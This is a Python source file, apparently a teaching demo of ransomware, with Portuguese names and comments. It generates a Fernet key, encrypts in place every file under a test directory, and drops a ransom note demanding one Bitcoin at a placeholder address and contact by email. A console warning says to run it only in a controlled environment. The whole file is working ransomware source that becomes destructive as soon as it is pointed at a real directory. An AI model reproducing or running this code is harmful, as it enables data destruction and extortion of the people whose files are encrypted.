import os
import time
from cryptography.fernet import Fernet

def gerar_chave():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


def carregar_chave():
    """Carrega a chave de criptografia do arquivo"""
    return open("chave.key", "rb").read()
def criptografar_arquivo(arquivo, chave):
    f = Fernet(chave)
    with open(arquivo, "rb") as file:
        dados = file.read()
    dados_criptografados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_criptografados)

def encontrar_arquivos(diretorio):
        """Encontra todos os arquivos no diretório especificado"""
        arquivos_encontrados = []
        for raiz, _, arquivos in os.walk(diretorio):
            for nome_arquivo in arquivos:
                caminho_completo = os.path.join(raiz, nome_arquivo)
                if nome_arquivo != "ransomware.py" and not nome_arquivo.endswith("chave.key") :
                    arquivos_encontrados.append(caminho_completo)
        return arquivos_encontrados

def criar_mensagem_resgate():
    """Cria um arquivo de mensagem de resgate"""
    with open("README_RESCUE.txt", "w") as file:
        file.write("Seus arquivos foram criptografados!\n")
        file.write("Para recuperar seus dados, envie 1 Bitcoin para o endereço abaixo:\n")
        file.write("1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q7R8S9T0U\n")
        file.write("Após o pagamento, envie um email para danielteste@gmail.com com o comprovante.\n")
        file.write("Você receberá a chave de descriptografia em até 24 horas.\n")

def main():
    gerar_chave()
    chave = carregar_chave()
    arquivos = encontrar_arquivos("arquivos_teste")
    for arquivo in arquivos:
        try:
            criptografar_arquivo(arquivo, chave)
            print(f"Arquivo criptografado: {arquivo}")
        except Exception as e:
            print(f"Erro ao criptografar {arquivo}: {e}")
    criar_mensagem_resgate()
    print("\n🔒 Todos os arquivos foram criptografados!")

if __name__ == "__main__":
    print("⚠️  EXECUTE APENAS EM AMBIENTE CONTROLADO!")
    time.sleep(3)
    main()
    
    